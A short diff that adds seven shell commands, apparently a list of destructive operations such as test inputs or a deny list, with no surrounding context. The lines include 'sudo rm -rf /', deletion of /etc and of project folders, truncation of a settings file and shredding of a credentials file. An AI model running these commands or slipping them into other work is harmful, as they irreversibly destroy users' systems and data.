@@ -1,0 +1,7 @@
+rm -rf ./config
+rm -rf /etc
+sudo rm -rf /
+rm --force --recursive ./src
+rmdir ./old_module
+truncate -s 0 ./config/settings.py
+shred ./credentials.json
